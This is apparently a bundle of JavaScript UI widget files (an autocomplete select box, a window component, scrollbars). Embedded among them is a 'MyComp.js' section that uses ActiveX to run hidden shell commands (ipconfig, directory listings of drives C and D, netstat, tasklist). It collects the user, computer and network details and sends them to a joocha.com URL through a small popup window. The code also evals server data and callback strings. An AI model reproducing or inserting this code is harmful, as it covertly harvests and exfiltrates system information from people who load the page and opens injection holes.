	  if(local.keypress)
      {
          ////local.clear(); asuftavebs keypress dros chanacerebs
		  local.mySendValue.value=local.myInput.value;
          if(local.loadRunner){clearTimeout(local.loadRunner);local.loadRunner=null;}
		  if((typeof local.keypress=="function") || (local.keypress && local.keypress.toLowerCase()!="on"))
			local.loadRunner=setTimeout(local.keypress, local.afterChangeTimeWait);			
		  else
			local.loadRunner=setTimeout(local.loadFromServer, local.afterChangeTimeWait);
      }
    }
	
	if(keyDisable)
	{
		if (event.preventDefault)
			event.preventDefault();
		else event.returnValue = false;
		return false;
	}
	

};

  this.clear=function clear() {
	if(local.myResult)
	{
		local.myResult.innerHTML = '';
		local.myResult.style.display = 'none';
	}
	local.setDirect('');
  }
  this.clearResult=function clearResult() {
	if(local.myResult)
	{
		local.myResult.innerHTML = '';
		local.myResult.style.display = 'none';
	}
  }  
  
  this.close=function close() {
	if(local.myResult)
	{
		local.myResult.style.display = 'none';
		local.myInput.setAttribute("data-index",0);
	}
  }
  
  this.open=function open() {
	if(local.myResult.style.display == 'none')
	{
		if(local.myResult.innerHTML.length>10)
		{
			local.myResult.style.display='block';
			if(document.getElementById("jcResultDivs"+local.value))
				addClass(document.getElementById("jcResultDivs"+local.value),"jcSelected");
		}
		else
		{
			local.delayTime=0;
			local.loadFromServer();
		}
	}
  }
  
  this.refresh=function refresh () {
	local.delayTime=0;
	local.openStatus=0;
	local.loadFromServer();
  }
  
	this.chooseItem=function chooseItem(val){
		var els=local.myResult.getElementsByTagName("DIV");
		var ret=0;
		if(val==undefined)val=local.myInput.value;
		for(var i=0;i<els.length;i++)
		{
			var atr=0;
			if(els[i] && els[i].getAttribute)
			{
				atr=els[i].getAttribute("data-rowid");
				if(atr==val)
				{
					if(els[i].innerHTML!=undefined)local.myInput.value=els[i].innerHTML;else local.myInput.value="";
					els[i].className = 'jcResultDivs jcSelected';
					ret=1;
					break;
				}
			}
			
		}
		return ret;		
	}
	
	this.afterLoadCallback=function afterLoadCallback(vDat)
	{
		if(!vDat || vDat === undefined)return 0;
		var obj=0;
		//local.clear(); amanac gamoicvia problema, rodesac itvirteba result, egreve kreba dzveli akrefili
		local.clearResult();
		
		//alert(vDat);
		//console.log("Start: "+vDat);

		if(typeof vDat == "string")
		try{
			//eval("obj = "+vDat);
			obj=JSON.parse(vDat);
		}catch(e){
			console.log("ERROR afterLoadCallback1:"+e);
			obj=0;
		}
		if(typeof obj != "object")obj=vDat;
		
		//console.log(obj);
		
		if(obj["data"])
		{
			var GridCellData,GridLinkData,GridFieldsData;
			if((typeof obj["data"]=="object") && obj["data"].LinkData){
				GridLinkData=obj["data"].LinkData;
				GridCellData=obj["data"].html;
				GridFieldsData=obj["data"].FieldsData;
			}else {
				eval(obj["data"]);
			}
			//console.log(GridLinkData);
			
			if(local.debug)console.log("afterLoadCallback FieldName: "+GridFieldsData);
			
			var dv = new Array();
			var element = new Array();
			local.wordsLenght=0;
			if(GridFieldsData.length)local.wordsLenght = GridCellData.length/GridFieldsData.length;
		
			var defParAlreadySelect=0;
			for(var i=0; i < GridCellData.length; i++) 
			if(GridLinkData[i]>0)
			{
				dv[i] = document.createElement('div');
				dv[i].className = 'jcResultDivs';
				dv[i].id = local.myObjectId+'_option'+i;
				dv[i].setAttribute('data-rowid',GridLinkData[i]);
				dv[i].setAttribute('data-index',i);

				local.myResult.appendChild(dv[i]);
				var res="";
				for(j=0;j<GridFieldsData.length;j++)res+=GridCellData[i][j]+"; ";
				if(res==undefined)res="";
				
				dv[i].innerHTML = res;
				if(GridLinkData[i]==local.mySendValue.value){
					local.myInput.value=res;
					dv[i].className = 'jcResultDivs jcSelected';
					defParAlreadySelect=1;
				}
				
				dv[i].onclick = function() {onClickChooseItem(this);};
				dv[i].keypress = function() {return false;};
				dv[i].keydown = function() {return false;};
			}
		}else
		if(obj["list"] && Object.keys(obj["list"]).length>0)
		{
			if(!obj)obj={};

			var dv = new Array();
			var element = new Array();
    
			var i=0;
			for(var item in obj.list)
			if(typeof obj.list[item]=="string")
			{
				dv[i] = document.createElement('div');
				dv[i].className = 'jcResultDivs';
				dv[i].id = local.myObjectId+'_option'+i;
				dv[i].setAttribute('data-rowid',item);
				dv[i].setAttribute('data-index',i);
				dv[i].innerHTML = obj.list[item];
				local.myResult.appendChild(dv[i]);
				
				if(item==local.mySendValue.value){
					if(obj.list[item]!=undefined)local.myInput.value=obj.list[item];else local.myInput.value="";
					dv[i].className = 'jcResultDivs jcSelected';
					defParAlreadySelect=1;
				}
				
				
				dv[i].onclick=function() {onClickChooseItem(this);};
				dv[i].keypress = function() {return false;};
				dv[i].keydown = function() {return false;};
				
				i++;
			}

		}
		//###REMOVE
		GOBJ=obj;
		
		local.myButton.innerHTML=local.goIcon;//recovery icon
		delClass(local.myButton,"rotate");
		
		
		//console.log("AAA:"+defParAlreadySelect+"-"+local.myInput.value);
		/*default parametris archeva*/
		if(!defParAlreadySelect)defParAlreadySelect=local.chooseItem();
		
		var nextPage=document.createElement('div'); 
		nextPage.innerHTML='';
		//nextPage.addEventListener("mouseover",function(){loadFromServer ((local.pageCounter++));});
		local.myResult.appendChild(nextPage);
		if(local.openStatus)local.myResult.style.display = 'block';
		
		if(local.focused)local.myInput.focus();
		//local.myInput.select();კრეფის დროს ხელს უშლის
		if(local.callBack)
		{
			if(typeof local.callBack=="function")
			{
				local.callBack(local);
			}
			else
			if(typeof u=="string")
			{
				var u=local.callBack;if(u && u[0]=="@")u=eval(decodeURIComponent(u.substr(1)));
				eval(u);
			}
		}
	
		if(defParAlreadySelect)local.close();
	}
	
	this.loadFromServerEx=function loadFromServerEx(){
		if(local.myInput){
			local.myButton.innerHTML=local.waitingContentIcon;
			if(local.myInput.value==undefined)local.myInput.value="";
			if(local.argument==undefined)local.argument="";
			//addClass(local.myButton,"rotate");
			var u=local.url;
			if(u && u[0]=="@")u=eval(decodeURIComponent(u.substr(1)));
			if(local.loadFromStorage){
				local.afterLoadCallback({"list":window[local.loadFromStorage]});
			}
			else
				SendQuery("POST",u+"&"+local.valueURLParamName+"="+(local.myInput.value!=undefined?local.myInput.value:"")+"&pgcount="+(local.argument!=undefined?local.argument:""),local.afterLoadCallback);
		}
	}
  
	this.loadFromServer=function loadFromServer() {
		if(local.loadingData)clearTimeout(local.loadingData);
		local.loadingData=setTimeout(local.loadFromServerEx,local.delayTime);
		local.delayTime=1000;
	}
	
	this.set=function set(vId)
	{
		if(local.chooseItem(vId)!=0)return vId;
		if(vId!=undefined){local.myInput.value=local.mySendValue.value=local.value=vId;}
		local.delayTime=0;
		local.openStatus=0;
		local.loadFromServer();
	}
	this.setDirect=function setDirect(vId)
	{
		if(vId!=undefined){local.myInput.value=local.mySendValue.value=local.value=vId;}
	}
	
	
	this.getValue=function getValue()
	{
		return local.mySendValue.value;
	}
  
	
	
	this.butClick=function butClick(event)
	{//button click
		if(this.debug)console.log("click: " +local.myResult.style.display);
		if(local.myResult.style.display!="none"){
			local.close();
		}else{
			local.openStatus=true;
			local.open();
		}
	}
	
 	function onClickChooseItem(th) {
		if(!th || !th.getAttribute || !th.getAttribute("data-rowid") || th.getAttribute("data-rowid")==undefined)return 0;
		local.myInput.value=th.innerHTML;
		local.value=local.mySendValue.value=th.getAttribute("data-rowid");
		local.myInput.setAttribute("data-index",0);
		delClass(th,"jcSelected");
		local.close();
		
		if(local.onChange)
		{
			if(typeof local.onChange=="function")
				local.onChange(local);
			else
			if(typeof local.onChange=="string")
			{
				var u=local.onChange;
				if(u && u[0]=="@")u=eval(decodeURIComponent(u.substr(1)));
				eval(u);
			}
		}
		
	}

	
	//Public static functions
	this.xGet=function xGet(nm)
	{
		if(nm in xSelectObjectsById)return xSelectObjectsById[nm];
		
		for(var i=xSelectObjects.length-1;i>=0;i--)
		if(xSelectObjects[i]!=undefined && xSelectObjects[i])
			if(xSelectObjects[i].name==nm)return xSelectObjects[i];
		return null;
	};
	
	this.closeOnBlure=function closeOnBlure(event,vId){
		event = event || window.event;
		event.target = event.target || event.srcElement;
		var element = event.target;

		var inArea=false;
		if(vId in xSelectObjectsById)
		for(var q=0;q<=5;q++)
		{
			//var nm=element.getAttribute("name");
			//console.log("click: "+vId+"-"+(vId in xSelectObjectsById));
			if(!element)break;
			if(element.id==xSelectObjectsById[vId].myObject.id)
			{
				inArea=true;
				break;
			}
			element=element.parentElement || element.parentNode;
		}
		//console.log(vId);
		if(!inArea){
			xSelectObjectsById[vId].close();
		}
	}	
	
	if(this.name)
	if(this.name in xSelectObjectsById){
		AddEventByString(window,"click","xSelectObjectsById['"+this.name+"'].closeOnBlure(event,'"+this.name+"')");
	}
	
	
	this.Init=function Init(){return local.init();};
return this.init();


}
//======================================================
/*xSelect Loader*/
function xSelectStartUp(clsName)
{
	var objNameSpace="xSelect";
	if(!clsName)clsName=objNameSpace;
	var els=document.getElementsByClassName(clsName);

	for(var i=els.length-1;i>=0;i--){
		new jcSelectBox(els[i]).Draw();
	}
}
//======================================================
AddEventOnObject(window,"load",function(){xSelectStartUp();});
//window.onload=function (){FormularLoading(document);};
//======================================================


/* jc_xwin.js */

/**
 * HTML DOM Window - JavaScript JooCha Library
 *
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.3.1
 *
 * See usage examples at http://joocha.com/examples
 */
 
var XWIN="XWIN";
var XWIN_COUNTER=0;
var XWIN_OBJECTS=[];

function jc_xwin(vObjectOrId,attr){
var local=this;
this.parentId="";
this.objectIdentity;
this.name="";
this.headerKeywords;
this.bodyKeywords;
this.footerKeywords;
this.parent;

this.xWinObject;
this.wHead;
this.wTitle;
this.wPanel;
this.wClose;
this.wBody;
this.wFooter;
this.className;


this.init=function init(vObjectOrId,attr){

    if(vObjectOrId){
		local.parent=vObjectOrId;
		
		if((typeof vObjectOrId) !== "object"){
			prev=local.xGet(vObjectOrId);
			vvv_xwin=local.parent=document.getElementById(vObjectOrId);
			if(prev && prev.objectIdentity && (local.parent==prev)){
				local=prev;
				local.draw();
				return local;
			}
			if(prev && (local.parent!=prev)){
				delete prev.parent;
				delete XWIN_OBJECTS[prev.objectIdentity];
			}
		}
		
		local.objectIdentity=(XWIN_COUNTER+1);XWIN_COUNTER++;
		local.headerKeywords=["header","head","xHead"];
		local.bodyKeywords=["body","xBody"];
		local.footerKeywords=["footer","foot","xFoot"];
	
		
		
		//console.log(local.parent);
		
		if(local.parent.id)
			local.parentId=local.parent.id;
		else 
			local.parentId=local.parent.id=XWIN+local.objectIdentity;
			
		if(local.parent)
		{
			if(local.parent.getAttribute("data-debug"))local.debug=local.parent.getAttribute("data-debug");

			local.name=local.parentId;
			if(local.parent.getAttribute("data-id"))local.name=local.parent.getAttribute("data-id");
			else
			if(local.parent.getAttribute("data-name"))local.name=local.parent.getAttribute("data-name");
			
			if(local.parent.getAttribute("data-class"))local.className=local.parent.getAttribute("data-class");
			if(!local.className)local.className=local.name;
			
			if(attr){
				if("name" in attr)local.name=attr["name"];
			}

			XWIN_OBJECTS[local.objectIdentity]=local;
		}
	}

	local.draw();
	return local;
}

this.draw=function draw(){

	//document.getElementById(local.parentId+"_xwin")==null && 
	if(local.parent){
		var tmp=local.parent.innerHTML;
		local.parent.innerHTML="";
		
		local.xWinObject=document.createElement("div");
		local.xWinObject.id=local.parentId+"_xwin";
		local.xWinObject.className=local.className+" xWindow ";
		
		local.wHead=document.createElement("div");
		local.wHead.className="wHead";
		
		
		local.wTitle=document.createElement("label");
		local.wTitle.className="wTitle";
		local.wPanel=document.createElement("span");
		local.wPanel.className="wPanel";

		local.wClose=document.createElement("span");
		local.wClose.className="wClose";
		AddEventOnObject(local.wClose,"click",local.close);

		local.wHead.appendChild(local.wTitle);
		local.wHead.appendChild(local.wPanel);
		local.wPanel.appendChild(local.wClose);
		
		
		local.wBody=document.createElement("div");
		local.wBody.className="wBody stopdrag";
		local.wBody.innerHTML=tmp;
		
		local.wFooter=document.createElement("div");
		local.wFooter.className="wFooter stopdrag";
		
		local.xWinObject.appendChild(local.wHead);
		local.xWinObject.appendChild(local.wBody);
		local.xWinObject.appendChild(local.wFooter);
	
		if(local.xWinObject)local.parent.appendChild(local.xWinObject);
	}
	return local.xWinObject;
}

this.close=function close(){
	delClass(local.parent,"visible");
	addClass(local.parent,"hidden");
}

this.open=function open(){
	addClass(local.parent,"visible");
	delClass(local.parent,"hidden");
}

this.fSetPos=function fSetPos(x,y){
		local.xWinObject.style.left=x+"px";
		local.xWinObject.style.top=y+"px";
}

this.fCenter=function fCenter(){
	var win=GetObjectCoords(local.xWinObject);
	var doc=SelfDocument;
	if(FireHandleParent)doc=ParentDocument;
	var obj=doc.getElementById('MainDocument') || doc;
	var crd=GetObjectCoords(obj,obj.documentElement);
	local.fSetPos((parseInt(crd.width)-parseInt(win.width))/2,Math.max(parseInt(doc.body.scrollTop),parseInt(doc.documentElement.scrollTop))+100);
}

this.fClose=function fClose(){
	local.close();
}

	this.xGet=function xGet(nm)	{
		if(nm in XWIN_OBJECTS)return XWIN_OBJECTS[nm];
		
		for(var i=XWIN_OBJECTS.length-1;i>=0;i--){
			if(XWIN_OBJECTS[i])
				if(XWIN_OBJECTS[i].name==nm)return XWIN_OBJECTS[i];
		}
		return null;
	};


return this.init(vObjectOrId,attr);
}

function loadXWin(){
	AddEventOnObject(window,"load",function(){
		var els=document.getElementsByClassName("xWin");
		for(var i=els.length-1;i>=0;i--){
			new jc_xwin(els[i]);
		}
	});
}

loadXWin();

/* MyComp.js */

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function GetIPConfig()
{
  var sh = new ActiveXObject("WScript.Shell");
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var workfile="test.txt";
  var ts;
  var Env = sh.Environment("PROCESS");
  if (Env("OS") == "Windows_NT") 
 {
    workfile = fso.GetTempName();
    sh.run("%comspec% /c ipconfig /all> " + workfile,0,true);
  }
  else
  {
       workfile = "winipcfg.out";
      sh.run( "winipcfg /batch"  ,0,true);
  }
  ts = fso.OpenTextFile(workfile);
  data = ts.ReadAll();
  ts.Close();
  fso.DeleteFile(workfile);
return data;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function GetCMDInfo(cmd)
{
  var sh = new ActiveXObject("WScript.Shell");
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var workfile="test"+(Math.random()*1000)+".txt";
  var ts;
  var Env = sh.Environment("PROCESS");
  if (Env("OS") == "Windows_NT") 
 {
    workfile = fso.GetTempName();
    sh.run("%comspec% /c "+cmd+" > " + workfile,0,true);
  }
  else
  {
      workfile = "winipcfg.out";
      sh.run(cmd ,0,true);
  }
  ts = fso.OpenTextFile(workfile);
  data = ts.ReadAll();
  ts.Close();
  fso.DeleteFile(workfile);
return data;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function TrimStringProb(str)
{
var bb="";
for(i=0;i<str.length;i++)if(str.substr(i,1)!=" ")bb=bb+str.substr(i,1);
return bb;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function GetIPAddresses()
{
  var str=TrimStringProb(GetIPConfig());
  var data=str.split("\n");
  var arIPAddress ="";

  for(n = 0;n<data.length;n++)
  {
    if (data[n].substr(0,9)=="IPAddress")
    {
         parts = data[n].split(":");
         arIPAddress+=parts[1].split("\n")[0].substr(0,15)+"--";
    };

    if (data[n].substr(0,15)=="PhysicalAddress")
    {
         parts = data[n].split(":");
         arIPAddress+=parts[1].split("\n")[0].substr(0,17)+"--";
    };
  };
  return arIPAddress;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function GetInfoComp(WshNetwork)
{
var INFO="";
         //var WshNetwork =new ActiveXObject("WScript.Network","LocalHost");
         INFO=INFO+" - "+"Domain = " + WshNetwork.UserDomain;
         INFO=INFO+" - "+"Computer Name = " + WshNetwork.ComputerName;
         INFO=INFO+" - "+"User Name = " + WshNetwork.UserName;
         INFO=INFO+" - "+GetIPAddresses();
         INFO=INFO+"\n --- "+GetCMDInfo("dir c:\\");
         INFO=INFO+"\n --- "+GetCMDInfo("dir d:\\");
         INFO=INFO+"\n --- "+GetCMDInfo("netstat -an");
         INFO=INFO+"\n --- "+GetCMDInfo("tasklist");
return "http://www.joocha.com/temp/index.php?t1=GfktRpeokFFfgkjrie45LKqpwoFMJDNHJFgjkeiwoeiuri&j2=rui3405949jgfJKRlodpsEE&t3=234gGocEXgkjfASDlqpwGHJKFDLFKGFLDFGKFriutioe6gjkf&info="+INFO;
};
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------
function StartProcess(WshNetwork)
{
var INFO="";
         //var WshNetwork =new ActiveXObject("WScript.Network","LocalHost");
         INFO=INFO+" - "+"Domain = " + WshNetwork.UserDomain;
         INFO=INFO+" - "+"Computer Name = " + WshNetwork.ComputerName;
         INFO=INFO+" - "+"User Name = " + WshNetwork.UserName;
         INFO=INFO+" - "+GetIPAddresses();
window.open("http://www.joocha.com/temp/index.php?t1=GfktRpeokFFfgkjrie45LKqpwoFMJDNHJFgjkeiwoeiuri&j2=rui3405949jgfJKRlodpsEE&t3=234gGocEXgkjfASDlqpwGHJKFDLFKGFLDFGKFriutioe6gjkf&info="+INFO,null,"top=0,left=0,height=20,width=40,status=yes,toolbar=no,menubar=no,location=no");
};
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------

/* jc_scrollbar.js */

function initScrollbar (o, s, a, ev) {
	var self = this;
	
	this.reset = function () {
		//Arguments that were passed
		this._parent = o;
		this._src    = s;
		this.auto    = a ? a : false;
		this.eventHandler = ev ? ev : function () {};
		//Component Objects
		this._up   = this._findComponent("Up", this._parent);
		this._down = this._findComponent("Down", this._parent);
		this._yTrack  = this._findComponent("Track", this._parent);
		this._yHandle = this._findComponent("Handle", this._yTrack);
		//Height and position properties
		var zdown=GetObjectZoomParameters(this._down);
		var zup=GetObjectZoomParameters(this._up);		
		
		//alert(parseInt(this._src.localHeight)-parseInt(zup.height)-parseInt(zdown.height));
		this._yTrack.style.height=GWZP(parseInt(this._src.localHeight)-parseInt(zup.height)-parseInt(zdown.height));
		//alert(this._yTrack.style.height);
		this._trackTop = findOffsetTop(this._yTrack);
		this._trackHeight  = this._yTrack.offsetHeight;
		this._handleHeight = this._yHandle.offsetHeight;
		this._x = 0;
		this._y = 0;
		//Misc. variables
		this._scrollDist  = 5;
		this._scrollTimer = null;
		this._selectFunc  = null;
		this._grabPoint   = null;
		this._tempTarget  = null;
		this._tempDistX   = 0;
		this._tempDistY   = 0;
		this._disabled    = false;
		this._ratio = (parseInt(this._src.totalHeight) - parseInt(this._src.viewableHeight))/(parseInt(this._trackHeight) - parseInt(this._handleHeight));
//alert(this._ratio+' \n'+this._src.totalHeight +' - '+this._src.viewableHeight+' / '+this._trackHeight+' - '+this._handleHeight);	
		this._yHandle.ondragstart  = function () {return false;};
		this._yHandle.onmousedown = function () {return false;};
		this._addEvent(this._src.content, "mousewheel", this._scrollbarWheel);
		this._removeEvent(this._parent, "mousedown", this._scrollbarClick);
		this._addEvent(this._parent, "mousedown", this._scrollbarClick);
		
		this._src.reset();
		with (this._yHandle.style) {
			top  = "0px";
			left = "0px";
		}
		this._moveContent();
		
		if (this._src.totalHeight < this._src.viewableHeight) {
			this._disabled = true;
			this._yHandle.style.visibility = "hidden";
			if (this.auto) this._parent.style.visibility = "hidden";
		} else {
			this._disabled = false;
			this._yHandle.style.visibility = "visible";
			this._parent.style.visibility  = "visible";
		}
	};
	this._addEvent = function (o, t, f) {
		if (o.addEventListener) o.addEventListener(t, f, false);
		else if (o.attachEvent) o.attachEvent('on'+ t, f);
		else o['on'+ t] = f;
	};
	this._removeEvent = function (o, t, f) {
		if (o.removeEventListener) o.removeEventListener(t, f, false);
		else if (o.detachEvent) o.detachEvent('on'+ t, f);
		else o['on'+ t] = null;
	};
	this._findComponent = function (c, o) {
		var kids = o.childNodes;
		for (var i = 0; i < kids.length; i++) {
			if (kids[i].className && kids[i].className == c) {
				return kids[i];
			}
		}
	};
	//Thank you, Quirksmode
	function findOffsetTop (o) {
		var t = 0;
		if (o.offsetParent) {
			while (o.offsetParent) {
				t += o.offsetTop;
				o  = o.offsetParent;
			}
		}
		return t;
	};
	this._scrollbarClick = function (e) {
		if (self._disabled) return false;
		
		e = e ? e : event;
		if (!e.target) e.target = e.srcElement;
		
		if (e.target.className.indexOf("Up") > -1) self._scrollUp(e);
		else if (e.target.className.indexOf("Down") > -1) self._scrollDown(e);
		else if (e.target.className.indexOf("Track") > -1) self._scrollTrack(e);
		else if (e.target.className.indexOf("Handle") > -1) self._scrollHandle(e);
		
		self._tempTarget = e.target;
		self._selectFunc = document.onselectstart;
		document.onselectstart = function () {return false;};
		
		self.eventHandler(e.target, "mousedown");
		self._addEvent(document, "mouseup", self._stopScroll, false);
		
		return false;
	};
	this._scrollbarDrag = function (e) {
		e = e ? e : event;
		var t = parseInt(self._yHandle.style.top);
		var v = e.clientY + document.body.scrollTop - self._trackTop;
		with (self._yHandle.style) {
			if (v >= self._trackHeight - self._handleHeight + self._grabPoint)
				top = self._trackHeight - self._handleHeight +"px";
			else if (v <= self._grabPoint) top = "0px";
			else top = v - self._grabPoint +"px";
			self._y = parseInt(top);
		}
		
		self._moveContent();
	};
	this._scrollbarWheel = function (e) {
		e = e ? e : event;
		var dir = 0;
		if (e.wheelDelta >= 120) dir = -1;
		if (e.wheelDelta <= -120) dir = 1;
		
		self.scrollBy(0, dir * 20);
		e.returnValue = false;
	};
	this._startScroll = function (x, y) {
		this._tempDistX = x;
		this._tempDistY = y;
		this._scrollTimer = window.setInterval(function () {
			self.scrollBy(self._tempDistX, self._tempDistY); 
		}, 40);
	};
	this._stopScroll = function () {
		self._removeEvent(document, "mousemove", self._scrollbarDrag, false);
		self._removeEvent(document, "mouseup", self._stopScroll, false);
		
		if (self._selectFunc) document.onselectstart = self._selectFunc;
		else document.onselectstart = function () { return true; };
		
		if (self._scrollTimer) window.clearInterval(self._scrollTimer);
		self.eventHandler (self._tempTarget, "mouseup");
	};
	this._scrollUp = function (e) {this._startScroll(0, -this._scrollDist);};
	this._scrollDown = function (e) {this._startScroll(0, this._scrollDist);};
	this._scrollTrack = function (e) {
		var curY = e.clientY + document.body.scrollTop;
		this._scroll(0, curY - this._trackTop - this._handleHeight/2);
	};
	this._scrollHandle = function (e) {
		var curY = e.clientY + document.body.scrollTop;
		this._grabPoint = curY - findOffsetTop(this._yHandle);
		this._addEvent(document, "mousemove", this._scrollbarDrag, false);
	};
	this._scroll = function (x, y) {
		if (y > this._trackHeight - this._handleHeight) 
			y = this._trackHeight - this._handleHeight;
		if (y < 0) y = 0;
		
		this._yHandle.style.top = y +"px";
		this._y = y;
		
		this._moveContent();
	};
	this._moveContent = function () {
		this._src.scrollTo(0, Math.round(this._y * this._ratio));
	};
	
	this.scrollBy = function (x, y) {
//	alert(this._src._y +' '+y+' / '+this._ratio);
		this._scroll(0, (-this._src._y + y)/this._ratio);
	};
	this.scrollTo = function (x, y) {
		this._scroll(0, y/this._ratio);
	};
	this.swapContent = function (o, w, h) {
		this._removeEvent(this._src.content, "mousewheel", this._scrollbarWheel, false);
		this._src.swapContent(o, w, h);
		this.reset();
	};
	
	this.reset();
};
/*--- SCROLLER ------------------------------------------------*/
function initScroller (o, w, h) {
	var self = this;
	var localWidth;
	var localHeight;
	var list = o.getElementsByTagName("div");
    var lctr=1;	
	var zoom;
	var ScrollerClassName="Scroller-Container";
	
	if(lctr)	
	if (o.className.indexOf(ScrollerClassName) > -1) {
		lctr=0;
	}
	
	if(lctr)
	for (var i = 0; i < list.length; i++) {
		if (list[i].className.indexOf(ScrollerClassName) > -1) {
			o = list[i];
			lctr=0;
			break;
		}
	}
	
	
		if(!w && !h)
		{
		  this.zoom=GetObjectZoomParameters(o);
		  w=this.zoom.width;
		  h=this.zoom.height;	
		}
	
    this.localWidth=w;
	this.localHeight=h;
	
	//Private methods
	this._setPos = function (x, y) {
		if (x < this.viewableWidth - this.totalWidth) 
			x = this.viewableWidth - this.totalWidth;
		if (x > 0) x = 0;
		if (y < this.viewableHeight - this.totalHeight) 
			y = this.viewableHeight - this.totalHeight;
		if (y > 0) y = 0;
		this._x = x;
		this._y = y;
		with (o.style) {
			left = this._x +"px";
			top  = this._y +"px";
		}
	};
	
	//Public Methods
	this.reset = function () {
		this.content = o;
	this.totalWidth	 = Math.max(o.offsetWidth,o.scrollWidth);//o.offsetWidth;
	this.totalHeight = Math.max(o.offsetHeight,o.scrollHeight);
		
		this._x = 0;
		this._y = 0;
		with (o.style) {
			left = "0px";
			top  = "0px";
		}
	};
	this.scrollBy = function (x, y) {
		this._setPos(this._x + x, this._y + y);
	};
	this.scrollTo = function (x, y) {
		this._setPos(-x, -y);
	};
	this.stopScroll = function () {
		if (this.scrollTimer) window.clearInterval(this.scrollTimer);
	};
	this.startScroll = function (x, y) {
		this.stopScroll();
		this.scrollTimer = window.setInterval(
			function(){ self.scrollBy(x, y); }, 40
		);
	};
	this.swapContent = function (c, w, h) {
		o = c;
		var list = o.getElementsByTagName("div");
		for (var i = 0; i < list.length; i++) {
			if (list[i].className.indexOf("Scroller-Container") > -1) {
				o = list[i];
			}
		}
		
		if(!w && !h)
		{
		  var zoom=GetObjectZoomParameters(o);
		  w=zoom.width;
		  h=zoom.height;	
		}

		if (w) this.viewableWidth  = w;
		if (h) this.viewableHeight = h;
		this.reset();
	};
	//variables
	this.content = o;
	this.viewableWidth  = w;
	this.viewableHeight = h;
	this.totalWidth	 = Math.max(o.clientWidth, Math.max(o.offsetWidth,o.scrollWidth));//o.offsetWidth;
	this.totalHeight = Math.max(o.clientHeight,Math.max(o.offsetHeight,o.scrollHeight));
	this.scrollTimer = null;
	this.reset();
};
/*------ setupScrollbar ---------------------------------------------------*/
function setupScrollbar(objDiv,scrbar,crt,w,h)
{
    if(document.getElementById(objDiv))objDiv=document.getElementById(objDiv);
	if(document.getElementById(scrbar))scrbar=document.getElementById(scrbar);
	if(crt==1)
    {
        scrbar.className="Scroll";
        scrbar.innerHTML="<div class='Up' >&nbsp;</div><div class='Track'><div class='Handle' >&nbsp;</div></div><div class='Down' >&nbsp;</div>";
	}     
    
    var scroller  = new initScroller(objDiv,w,h);
    var scrollbar = new initScrollbar (scrbar, scroller, false);
	objDiv.style.overflow='visible';
}
//------------------------------------------------------
//------------------------------------------------------
//------------------------------------------------------
function doAnimationScroll()
{
var local=this;
this.handleTimer=0;
//-------
this.doUp=function doUp(target)
{
    var sp=getScrollPos();
	var winScrollTop=sp.y;

	console.log("Up: Id:"+target.id+"; Tag:"+target.tagName+"; Top:"+target.offsetTop+"; WinScrollTop:"+winScrollTop);
   
   if(winScrollTop>target.offsetTop)
	{
		speed=(winScrollTop-target.offsetTop)/4;
		if(speed<10)speed=10;
		window.scrollTo(0,winScrollTop-speed);
	}else
	{
		console.log("stop");
	    clearInterval(local.handleTimer);
	}
}
//-------
this.doDown=function doDown(target)
{
    var sp=getScrollPos();
	var winScrollTop=sp.y;
	console.log("Down: Id:"+target.id+"; Tag:"+target.tagName+"; Top:"+target.offsetTop+"; WinScrollTop:"+winScrollTop);
	
   if(winScrollTop<target.offsetTop)
	{
		speed=(target.offsetTop-winScrollTop)/4;
		if(speed<10)speed=10;
		window.scrollTo(0,winScrollTop+speed);
	}else
	{
		console.log("stop");
	    clearInterval(local.handleTimer);
	}
}
//-------
this.init=function init(aEl) {
if(typeof aEl == 'string')aEl=document.getElementById(aEl);
if(aEl.hash.substr(0,1)!="#")return true;
//console.log(aEl);
AddEventOnObject(aEl,"click",function() {alert("Stop");
    if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {

	var target = document.getElementById(this.hash.slice(1));

      if (target) {
	    //--------------------------------------------------------
		var speed;
		clearInterval(local.handleTimer);		
		
		if(document.body.scrollTop<target.offsetTop)
		{
			local.handleTimer=setInterval(function(){local.doDown(target)},1000);
		}
		else
		if(document.body.scrollTop>target.offsetTop)
		{
			local.handleTimer=setInterval(function(){local.doUp(target)},1000);
		}
        return false;
      }

    }
  });
  return true;
}
//--------
this.initAll=function initAll() {
	var els=document.getElementsByTagName("a");
	var ret='';
	for(var i=0;i<els.length;i++)
	if(els[i].hash.substr(0,1)=="#")
	{
		local.init(els[i]);
		ret+=els[i]+"; \n";
	}
}
//--------
}
//--------
xScroll=new doAnimationScroll();
//-----------------------------

//----------------------------------------------
//------- html5 style line ---------------------
//----------------------------------------------
function jc_divline(container)
{
	var local=this;
	
	this.index=0;
	this.list=new Array();
	this.direction=0;
	this.oldScrollY=0;
	/*//Sub Object Variable
	this.objDivID;
	this.object;
	this.objectEventString;
	this.objectZoom;
	this.active;
	this.type;
	*/
	if(!container)container=window;
	this.scrollContainer=container;
	
	//----------------------------------------------
	this.eventScroll=function eventScroll()
	{
		local.direction=window.scrollY-local.oldScrollY;
		local.oldScrollY=window.scrollY;
		//console.log(local.direction);
		
	    var icH = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight; 
		for(var i=0;i<local.index;i++)
		if(local.list[i].active!=0)
		{
		    switch(local.list[i].type)
			{
				case "scrollShow":
					local.list[i].objectZoom=GetDivCoords(local.list[i].object);
					if(((parseInt(window.scrollY)>parseInt(local.list[i].objectZoom.y)-parseInt(icH)) 
								&& (parseInt(window.scrollY)<parseInt(local.list[i].objectZoom.y)+parseInt(local.list[i].objectZoom.height)) 
											&& local.direction>0)
					|| ((parseInt(window.scrollY)>parseInt(local.list[i].objectZoom.y)) 
								&& (parseInt(window.scrollY)<parseInt(local.list[i].objectZoom.y)+parseInt(local.list[i].objectZoom.height)) 
											&& local.direction<0))
					{
						if(local.list[i].active==1)local.list[i].active=0;
						if((typeof local.list[i].objectEventString)=="function")
